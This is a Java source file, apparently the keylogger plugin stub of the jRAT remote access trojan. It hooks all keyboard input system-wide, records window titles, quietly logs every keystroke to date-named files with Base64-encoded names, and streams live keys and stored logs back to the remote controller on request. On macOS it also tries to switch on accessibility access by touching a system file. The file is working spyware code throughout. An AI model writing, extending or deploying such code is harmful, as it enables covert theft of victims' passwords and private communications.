package pro.jrat.plugin.keylogger.stub;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

import org.jnativehook.GlobalScreen;

import pro.jrat.api.stub.utils.OperatingSystem;
import pro.jrat.plugin.keylogger.stub.activities.Activities;
import pro.jrat.plugin.keylogger.stub.activities.Activity;
import pro.jrat.plugin.keylogger.stub.activities.Key;
import pro.jrat.plugin.keylogger.stub.activities.Time;
import pro.jrat.plugin.keylogger.stub.activities.Title;
import pro.jrat.plugin.keylogger.stub.codec.Base64;

public class StubPlugin extends pro.jrat.api.stub.StubPlugin {

	public static DataInputStream dis;
	public static DataOutputStream dos;
	public static boolean enabled;

	public static final byte KEY_HEADER = 121;
	public static final byte TITLE_HEADER = 122;
	public static final byte STATUS_HEADER = 123;
	public static final byte LOGS_HEADER = 124;
	public static final byte LOG_HEADER = 125;
	
	public void onEnable() throws Exception {
		
	}

	public void onDisconnect(Exception ex) {

	}

	public void onConnect(DataInputStream in, DataOutputStream out) {
		StubPlugin.dis = in;
		StubPlugin.dos = out;
	}

	public void onPacket(byte header) throws Exception {
		if (header == STATUS_HEADER) {
			dos.writeByte(STATUS_HEADER);

			int size = Activities.online.size();

			dos.writeInt(size);

			for (int i = 0; i < size; i++) {
				Activity activity = Activities.online.remove(0);
				try {
					dos.writeBoolean(activity instanceof Key);
					activity.write(dos);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		} else if (header == LOGS_HEADER) {
			File[] years = Keylogger.getLogsRoot().listFiles();
			
			dos.writeByte(LOGS_HEADER);
			
			dos.writeInt(years.length);
			
			for (File year : years) {
				dos.writeUTF(Base64.decode(year.getName()));
				
				File[] months = year.listFiles();
				
				dos.writeInt(months.length);
				
				for (File month : months) {
					dos.writeUTF(Base64.decode(month.getName()));
					
					File[] days = month.listFiles();
					
					dos.writeInt(days.length);
					
					for (File day : days) {
						dos.writeUTF(Base64.decode(day.getName()));
					}
				}
			}
		} else if (header == LOG_HEADER) {
			String year = dis.readUTF();
			String month = dis.readUTF();
			String day = dis.readUTF();
			
			File file = new File(Keylogger.getLogsRoot().getAbsolutePath() + "/" + Base64.encode(year) + "/" + Base64.encode(month) + "/" + Base64.encode(day));
		
			List<String> lines = new ArrayList<String>();
			String s;
			
			BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
			
			while ((s = reader.readLine()) != null) {
				lines.add(s);
			}
			
			reader.close();
			
			dos.writeByte(LOG_HEADER);
		
			for (int i = 0; i < lines.size(); i++) {
				String line = lines.get(i);
				
				dos.writeBoolean(true);
				
				if (line.startsWith("[Window:") || line.startsWith("[Date:")) {
					dos.writeInt(-1);
					dos.writeUTF(line);
				} else {
					dos.writeInt(line.length());
					dos.writeChars(line);
				}
			}
			
			dos.writeBoolean(false);
			
			lines.clear();
		}
	}

	public String getVersion() {
		return "1.0";
	}

	@Override
	public String getName() {
		return "Keylogger";
	}

	public static boolean isRoot() throws Exception {
		return !System.getProperty("os.name").toLowerCase().contains("win") && new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine().equals("root");
	}

	@Override
	public void onStart() throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
				System.out.println("Trying to enable assistive devices... Even if enabled");
				
				Runtime.getRuntime().exec("touch /private/var/db/.AccessibilityAPIEnabled");
				
				System.out.println("Successfully executed command");
			}		
		} catch (Exception ex) {
			ex.printStackTrace();
			System.out.println("Failed to execute command. No root?");
		}
		
		GlobalScreen.registerNativeHook();
		GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());

		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			try {
				new Thread(new TitleListener()).start();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					GlobalScreen.unregisterNativeHook();
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		}));
		
		new Thread(new Runnable() {
			@Override
			public void run() {
				while (true) {
					try {
						Thread.sleep(1000L * 60L);
						
						Activity lastItem = Activities.activities.get(Activities.activities.size());
						
						if (lastItem != null && !(lastItem instanceof Time) || lastItem == null) {
							Activities.add(new Time(System.currentTimeMillis()));
						}
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}
			}
		}).start();
		
		new Thread(new Runnable() {
			@Override
			public void run() {
				while (true) {
					try {
						Thread.sleep(1000L);
						
						PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter(Keylogger.getTodaysFile(), true)));
										
						for (Activity a : Activities.activities) {
							if (a instanceof Title) {
								out.println("\n[Window: " + a.toString() + "]\n");
							} else if (a instanceof Time) {
								out.println("\n[Date: " + a.toString() + "]\n");
							} else if (a instanceof Key) {
								char ckey = ((Key)a).getChar();
								String key;
								
								if (ckey == '\b') {
									key = "[BACKSPACE]";
								} else if (ckey == '\n' || ckey == '\r') {
									key = "[ENTER]\n";
								} else if (ckey == '\t') {
									key = "[TAB]\t";
								} else {
									key = Character.toString(ckey);
								}
									
								out.print(key);
							} else {
								throw new Exception("Not valid activity");
							}
						}
						
						Activities.activities.clear();
						
						out.close();
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}	
		}).start();
	}
}
